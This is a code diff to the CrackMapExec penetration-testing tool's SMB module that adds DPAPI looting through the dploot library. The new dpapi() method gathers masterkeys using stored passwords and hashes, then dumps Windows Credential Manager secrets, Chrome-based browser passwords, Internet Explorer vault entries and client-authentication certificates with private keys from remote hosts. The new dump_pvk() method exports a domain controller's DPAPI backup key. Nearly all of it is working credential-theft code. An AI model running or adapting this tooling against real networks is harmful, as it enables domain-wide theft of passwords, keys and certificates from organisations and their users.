@@ -36,6 +36,14 @@ from cme.helpers.logger import highlight
 from cme.helpers.misc import *
 from cme.helpers.bloodhound import add_user_bh
 from cme.helpers.powershell import create_ps_command
+from dploot.triage.certificates import CertificatesTriage
+from dploot.triage.vaults import VaultsTriage
+from dploot.triage.browser import BrowserTriage
+from dploot.triage.credentials import CredentialsTriage
+from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
+from dploot.triage.backupkey import BackupkeyTriage
+from dploot.lib.target import Target
+from dploot.lib.smb import DPLootSMBConnection
 from pywerview.cli.helpers import *
 from pywerview.requester import RPCRequester
 from time import time
@@ -163,10 +171,14 @@ class smb(connection):
         cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
         cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
         cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
+        cegroup.add_argument("--dpapi", action='store_true', help='dump DPAPI secrets from target systems')
+        cegroup.add_argument("--dump-pvk", action='store_true', help='DPAPI option. Dump domain backupkey on domain controller')
         #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
         #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
 
         ngroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+        ngroup.add_argument("--mkfile", action='store', help='DPAPI option. File with masterkeys in form of {GUID}:SHA1')
+        ngroup.add_argument("--pvk", action='store', help='DPAPI option. File with domain backupkey')
         ngroup.add_argument("--enabled", action='store_true', help='Only dump enabled targets from DC')
         ngroup.add_argument("--user", dest='userntds', type=str, help='Dump selected user from DC')
 
@@ -1158,6 +1170,92 @@ class smb(connection):
             SAM.finish()
 
     @requires_admin
+    def dpapi(self):
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            target=self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            use_kcache=self.use_kcache,
+        )
+
+        conn = DPLootSMBConnection(target) 
+        conn.connect()
+
+        pvkbytes = None
+        if self.args.pvk is not None:
+            try:
+                pvkbytes = open(self.args.pvk, 'rb').read()
+            except Exception as e:
+                logging.error(str(e))
+
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.error(str(e))
+
+        self.logger.info("Gathering masterkeys")
+
+        plaintexts = {username:password for _, _, username, password, _,_ in self.db.get_credentials(credtype="plaintext")}
+        nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in self.db.get_credentials(credtype="hash")}
+        if self.password == '' or self.password is None:
+            plaintexts[self.username] = self.password
+        if self.nthash == '' or self.nthash is None:
+            nthashes[self.username] = self.nthash
+
+        # Collect User and Machine masterkeys
+        masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=pvkbytes, passwords=plaintexts, nthashes=nthashes)
+        masterkeys += masterkeys_triage.triage_masterkeys()
+        masterkeys += masterkeys_triage.triage_system_masterkeys()
+
+        self.logger.info("Looting secrets")
+
+        # Collect User and Machine Credentials Manager secrets
+        credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
+        credentials = credentials_triage.triage_credentials()
+        for credential in credentials:
+            self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+        system_credentials = credentials_triage.triage_system_credentials()
+        for credential in system_credentials:
+            self.logger.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
+
+        # Collect Chrome Based Browser stored secrets
+        browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
+        browser_credentials, _ = browser_triage.triage_browsers()
+        for credential in browser_credentials:
+            self.logger.highlight("[%s] %s - %s:%s" % (credential.browser.upper(), credential.url, credential.username, credential.password))
+
+        # Collect User Internet Explorer stored secrets
+        vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
+        vaults = vaults_triage.triage_vaults()
+        for vault in vaults:
+            if vault.type == 'Internet Explorer':
+                self.logger.highlight("[Internet Explorer] %s - %s:%s" % (vault.resource, vault.username, vault.password))
+
+        # Collect User and Machine certificates with private keys
+        certificates_triage = CertificatesTriage(target=target,conn=conn, masterkeys=masterkeys)
+        certificates = certificates_triage.triage_certificates()
+        for certificate in certificates:
+            if certificate.clientauth:
+                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
+                self.logger.success("Writting certificate to %s" % filename)
+                with open(filename, "wb") as f:
+                    f.write(certificate.pfx)
+        system_certificates = certificates_triage.triage_system_certificates()
+        for certificate in system_certificates:
+            if certificate.clientauth:
+                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
+                self.logger.success("Writting certificate to %s" % filename)
+                with open(filename, "wb") as f:
+                    f.write(certificate.pfx)
+
+    @requires_admin
     def lsa(self):
         self.enable_remoteops()
 
@@ -1188,6 +1286,30 @@ class smb(connection):
                 logging.debug("Error calling remote_ops.finish(): {}".format(e))
 
             LSA.finish()
+
+    @requires_admin
+    def dump_pvk(self):
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            target=self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            use_kcache=self.use_kcache,
+        )
+
+        conn = DPLootSMBConnection(target) 
+        conn.connect() # Connect to DC
+
+        self.logger.info("Downloading Domain Backupkey")
+        backupkey_triage = BackupkeyTriage(target=target, conn=conn)
+        backupkey = backupkey_triage.triage_backupkey()
+        outputfile = '%s.pvk' % self.domain
+        open(outputfile, 'wb').write(backupkey.backupkey_v2)
+        self.logger.success("Domain backupkey exported to file {}".format(outputfile ))
 
     def ntds(self):
         self.enable_remoteops()
